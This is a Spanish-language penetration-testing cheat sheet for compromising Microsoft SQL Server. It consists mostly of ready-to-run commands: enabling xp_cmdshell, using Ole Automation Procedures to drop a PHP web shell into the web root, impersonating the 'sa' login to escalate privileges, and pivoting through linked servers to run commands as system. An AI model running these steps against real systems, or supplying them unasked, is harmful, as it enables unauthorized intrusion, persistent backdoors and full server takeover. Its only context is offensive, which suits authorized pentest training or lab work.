
# Para Ejecutar Comandos (Si tenemos los permisos adecuados o mal configurados)

Primero podemos verificar si tenemos permisos de escritura con el siguiente comando:

```SQL-Creo-que-es-con-sqlcmd

```

Si `xp_cmdshell` no está habilitado podremos habilitarlo con los privilegios adecuados:
```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

# Para crear archivos
Para escribir archivos usando `MSSQL`, necesitamos habilitar `Procedimientos de automatización Ole` , que requiere privilegios de administrador, y luego ejecutar algunos procedimientos almacenados para crear el archivo:
## Para habilitarlo:
```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
## Para crear el archivo:
```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

# Suplantación de indetidad / escalada

Primero comprobaremos los usuarios a los que podemos suplantar mediante la herramienta sqlcmd:
```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```
O
```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```


Para verificar los permisos de un usuario (Para saber si domos administradores) esto solo verifica los permisos en la base de datos en las que estemos, por esta razón conviene irse a la base de datos maestra para hacer este ataque.
```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```
Si debajo del nombre sale un `0` no tenemos permisos de administrador pero en cambio si sale un `1` si los tenemos.

```
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```
Si el usuario no tiene acceso a esa base de datos saldra un mensaje como: `Try to move to the master DB using USE master`
# Comunicarse con otras bases de datos con MSSQL
MSSQL puede tener servidores vinculados, vamos a comprobarlos con lo siguiente:
```
1> SELECT srvname, isremote FROM sysservers
2> GO
```
Si al lado del `srvname` nos da un 1 es que es un servidor vinculado.

Y con el siguiente comando podemos intentar loggear en esa base de datos remota con el usuario y los privilegios que tenemos actualmente:
```
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [SRVNAME]
2> GO
```
O
```
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [SRVNAME]
```

## Ejemplo (imacket-mssqlclient):
```
SELECT srvname, isremote FROM sysservers;
srvname                 isremote   
---------------------   --------   
WINSRV02\SQLEXPRESS            1   

LOCAL.TEST.LINKED.SRV          0   
```

Entonces:
```
EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]

EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]

EXEC ('sp_configure ''xp_cmdshell'',1') AT [LOCAL.TEST.LINKED.SRV]

EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
```

Después:
```
EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
```
Y ya seríamos system
